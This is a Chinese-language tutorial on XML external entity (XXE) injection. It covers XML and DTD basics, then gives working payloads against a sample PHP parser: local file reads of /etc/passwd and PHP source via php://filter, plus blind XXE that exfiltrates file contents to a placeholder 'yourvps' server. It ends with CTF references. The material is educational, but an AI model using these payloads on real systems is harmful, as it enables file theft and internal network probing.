# XML实体注入

## 基础知识

XML（Extensible Markup Language）被设计用来传输和存储数据。关于它的语法，本文不准备写太多，只简单介绍一下。

### XML基本知识

```markup
<?xml version="1.0" encoding="utf-8"?>
<note>
<to>chybeta</to>
<from>ph0en1x</from>
</note>
```

在上面代码中的第一行，定义XML的版本与编码。

在XML文档中，所有的元素都必须正确的嵌套，形成树形结构。并且整个XML文档中必须要有一个根元素。如上代码，`<note>`是整个文档的根元素。嵌套在note标签中的`<to>`和`<from>`则是根的子元素。

同时，所有的XML元素都必须有关闭标签，这点不像html语法那样松散。如果缺失关闭标签，则会导致XML解析失败。

### 实体

所有的XML文档都由五种简单的构建模块（元素，属性，实体，PCDATA CDATA）构成。这里着重介绍一下实体：实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声明。因此我们利用引入实体，构造恶意内容，从而达到攻击的目的。

#### 实体类型

XML实体分为四种：字符实体，命名实体，外部实体，参数实体。

### 文档类型定义：DTD

wikipedia关于这的描述是:The XML DTD syntax is one of several XML schema languages。简单的说，DTD的作用是定义XML文档的合法构建模块。如前所述，实体也是构建模块之一。因此可以利用DTD来内部或外部引入实体。

其基本格式：

```markup
<!DOCTYPE 根元素名 [  元素描述   ]>
```

#### 内部引入

格式：

```markup
<!ENTITY 实体名称 "实体的值">
```

将DTD和XML放在同一份文档中，利用DTD定义的实体即为内部实体。

```markup
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE xxe [  
    <!ENTITY  chybeta  "Hello World!">    
]>  
<xxe>  
    &chybeta;
</xxe>
```

访问该XML文档，`&chybeta;`会被解析为Hello World!并输出。

#### 外部引入

基本格式：

```markup
<!ENTITY 实体名称 SYSTEM "URI">
```

通过引用定义在外部的DTD中的实体，我们称之为外部实体。 由于xxe漏洞主要利用的是外部实体，所以这里暂不展开。具体实例见下。

## 利用方式

### xxe注入

以php环境为例，index.php内容如下：

```php
<?php
  $xml=simplexml_load_string($_GET['xml']);
  print_r((string)$xml);
?>
```

#### 读取本地文件

![](https://thief.one/upload_image/20170620/1.png)

利用各种协议可以读取文件。比如file协议，这里的测试环境为win，所以这里我选择读取c盘里的TEST.txt。

```markup
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [<!ENTITY  file SYSTEM "file:///c://TEST.txt">]>
<root>&file;</root>
```

将上述xml进行url编码后传进去，可以发现读取了TEST.txt中的内容。 ![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/2.jpg?raw=true)

我这里测试时，如果不进行url编码则不能成功解析。

若使用fill协议，在unix环境下，可以用如下xml来读取passwd：

```markup
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [<!ENTITY  file SYSTEM "file:///etc/passwd">]>
<root>&file;</root>
```

如果要读取php文件，因为php、html等文件中有各种括号`<`，`>`，若直接用file读取会导致解析错误，此时可以利用`php://filter`将内容转换为base64后再读取。

```markup
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [<!ENTITY  file SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
<root>&file;</root>
```

这里同样先经过url编码后再传入。读取结果如下: ![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/3.jpg?raw=true)

#### 命令执行

php环境下，xml命令执行要求php装有expect扩展。而该扩展默认没有安装。这里暂不进行测试。

#### 内网探测/SSRF

由于xml实体注入攻击可以利用`http://`协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。

### bind xxe

以php环境为例，现在更改index.php内容如下：

```php
<?php
  $xml=simplexml_load_string($_GET['xml']);
?>
```

少了print\_r，即没有回显消息。这个时候我们可以利用参数实体，通过发起http请求来攻击。

#### 读取本地文件

**payload1**

```markup
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///c://TEST.txt">
<!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml">
%dtd; %all;
]>
<value>&send;</value>
```

在我的vps的xxe.xml的内容如下：

```markup
<!ENTITY % all "<!ENTITY send SYSTEM 'http://yourvps/%file;'>">
```

而测试文件TEST.txt内容为：

```text
chybeta
```

整个的调用过程如下：解析时`%dtd`引入xxe.xml，之后`%all`引入`send`的定义，最后引用了实体send，把`%file`文件内容通过一个http请求发了出去。注意需要把payload经过url编码。查看vps上的access.log：

![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/4.jpg?raw=true)

若要读取php等文件，同样需要先经过base64加密下。

```markup
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=index.php">
<!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml">
%dtd; %all;
]>
<value>&send;</value>
```

查看access.log: ![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/5.jpg?raw=true)

**payload2**

发送的xml：

```markup
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data  [
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=index.php">
<!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml">
%dtd; %send;
]>
```

而在vps上的xxe.xml内容为：

```markup
<!ENTITY % payload2 "<!ENTITY &#x25; send SYSTEM 'http://yourvps/%file;'>"> %payload2;
```

注意的是，`&#25;` 不能直接写成`%`，否则无法解析。

xxe.xml中定义和引用了`%payload2`,在通过`%dtd`引入xxe.xml后，得以使用符号实体%send来进行发送。其中%file为读取的文件内容。查看access.log:

![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/6.jpg?raw=true)

## ctf

### 小试牛刀

拿jarvisoj平台上的题目来小试牛刀吧。

题目：[api调用](http://web.jarvisoj.com:9882/)

题目描述：请设法获得目标机器/home/ctf/flag.txt中的flag值

![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/7.jpg?raw=true)

![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/8.jpg?raw=true)

![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/9.jpg?raw=true)

### xxe相关WP

* [AliCTF-Quals-2014 WebA-300](http://z1ng.net/post/thoughts/alictf-2014-writeup)
* [HCTF-2016 大图书管的牧羊人&&魔法禁书目录](https://github.com/iAklis/epub-library-challenge)
* [GoSecure-CTF-2015 web-300](https://gist.github.com/h3xstream/3d51b99f651548f7fa2b)

